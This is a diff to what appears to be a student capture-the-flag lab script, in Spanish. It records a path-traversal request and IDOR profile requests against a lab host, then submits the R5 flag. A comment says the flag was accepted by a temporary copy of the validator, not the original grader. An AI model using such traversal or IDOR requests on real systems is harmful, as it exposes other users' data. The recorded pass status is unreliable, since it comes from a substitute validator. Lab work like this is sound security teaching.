@@ -36,3 +36,35 @@ curl -sS -i -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/l
 # Copiar evidencias al directorio de entrega
 mkdir -p entregas/lab07/grupo06/evidencia/salidas
 cp .loot/r4-traversal-base.txt .loot/r4-traversal.txt entregas/lab07/grupo06/evidencia/salidas/
+
+# ==========================================
+# R5 — IDOR / Control de acceso roto
+# Responsable: Belén Benito
+# ==========================================
+
+# Entorno: cyberlab-attacker
+# Consulta del perfil propio (línea base)
+curl -i "http://phantomcorp/perfil?id=3"
+
+# Guardar evidencia original
+curl -sS -i "http://phantomcorp/perfil?id=3" > r5-idor-base.txt
+
+# Consulta del perfil administrativo
+curl -i "http://phantomcorp/perfil?id=1"
+
+# Guardar evidencia original
+curl -sS -i "http://phantomcorp/perfil?id=1" > r5-idor-admin.txt
+
+# Comprobar archivos guardados
+cat r5-idor-base.txt
+cat r5-idor-admin.txt
+ls -l r5-idor-*.txt
+
+# Validación desde PowerShell con una copia temporal
+# del validador compatible con Linux
+docker exec cyberlab-attacker bash /tmp/lab07-ctf/ctf submit 07 R5 'FLAG{idor_broken_access}'
+docker exec cyberlab-attacker bash /tmp/lab07-ctf/ctf status 07
+# La flag R5 fue aceptada mediante una copia temporal del validador,
+# preparada para solucionar problemas de compatibilidad entre Windows y Linux.
+# El estado obtenido corresponde a esa copia temporal y se conserva en
+# evidencia/salidas/r5-status-07.txt.
